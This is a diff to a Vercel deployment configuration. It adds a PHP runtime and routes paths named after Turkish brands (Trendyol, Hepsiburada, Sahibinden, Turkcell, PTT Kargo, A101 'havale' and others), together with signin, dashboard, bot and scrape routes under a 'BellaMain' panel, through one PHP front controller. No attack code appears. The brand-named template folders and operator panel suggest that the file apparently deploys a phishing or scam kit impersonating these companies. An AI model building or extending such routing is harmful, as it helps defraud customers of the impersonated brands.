@@ -1,4 +1,11 @@
 {
+  "functions": {
+    "api/php-front.php": {
+      "runtime": "vercel-php@0.6.2",
+      "memory": 3008,
+      "maxDuration": 60
+    }
+  },
   "rewrites": [
     { "source": "/", "destination": "/BellaMain/signin.html" },
     { "source": "/signin", "destination": "/BellaMain/signin.html" },
@@ -12,7 +19,33 @@
     { "source": "/api/bot/:path*", "destination": "/api/bot/:path*" },
     { "source": "/api/scrape/:path*", "destination": "/api/scrape/:path*" },
     { "source": "/api/data/:path*", "destination": "/api/data/:path*" },
-    { "source": "/api/public/:path*", "destination": "/api/public/:path*" }
+    { "source": "/api/public/:path*", "destination": "/api/public/:path*" },
+
+    { "source": "/index.php", "destination": "/api/php-front.php?p=/index.php" },
+    { "source": "/health.php", "destination": "/api/php-front.php?p=/health.php" },
+    { "source": "/BellaMain/:path*", "destination": "/api/php-front.php?p=/BellaMain/:path*" },
+    { "source": "/migros/:path*", "destination": "/api/php-front.php?p=/migros/:path*" },
+    { "source": "/trendyol/:path*", "destination": "/api/php-front.php?p=/trendyol/:path*" },
+    { "source": "/hepsiburada/:path*", "destination": "/api/php-front.php?p=/hepsiburada/:path*" },
+    { "source": "/sahibinden/:path*", "destination": "/api/php-front.php?p=/sahibinden/:path*" },
+    { "source": "/Dolap/:path*", "destination": "/api/php-front.php?p=/Dolap/:path*" },
+    { "source": "/Letgo/:path*", "destination": "/api/php-front.php?p=/Letgo/:path*" },
+    { "source": "/Pttavm/:path*", "destination": "/api/php-front.php?p=/Pttavm/:path*" },
+    { "source": "/shopier/:path*", "destination": "/api/php-front.php?p=/shopier/:path*" },
+    { "source": "/turkcell/:path*", "destination": "/api/php-front.php?p=/turkcell/:path*" },
+    { "source": "/pttkargo/:path*", "destination": "/api/php-front.php?p=/pttkargo/:path*" },
+    { "source": "/pasaj2/:path*", "destination": "/api/php-front.php?p=/pasaj2/:path*" },
+    { "source": "/a101havale/:path*", "destination": "/api/php-front.php?p=/a101havale/:path*" },
+    { "source": "/bim_online/:path*", "destination": "/api/php-front.php?p=/bim_online/:path*" },
+    { "source": "/pttavm_alt/:path*", "destination": "/api/php-front.php?p=/pttavm_alt/:path*" },
+    { "source": "/Kargo/:path*", "destination": "/api/php-front.php?p=/Kargo/:path*" },
+    { "source": "/dashboard/:path*", "destination": "/api/php-front.php?p=/dashboard/:path*" },
+    { "source": "/signin/:path*", "destination": "/api/php-front.php?p=/signin/:path*" },
+    { "source": "/signup/:path*", "destination": "/api/php-front.php?p=/signup/:path*" },
+    { "source": "/logout/:path*", "destination": "/api/php-front.php?p=/logout/:path*" },
+    { "source": "/templates/:path*", "destination": "/api/php-front.php?p=/templates/:path*" },
+    { "source": "/config/:path*", "destination": "/api/php-front.php?p=/config/:path*" },
+    { "source": "/scripts/:path*", "destination": "/api/php-front.php?p=/scripts/:path*" }
   ],
   "headers": [
     {
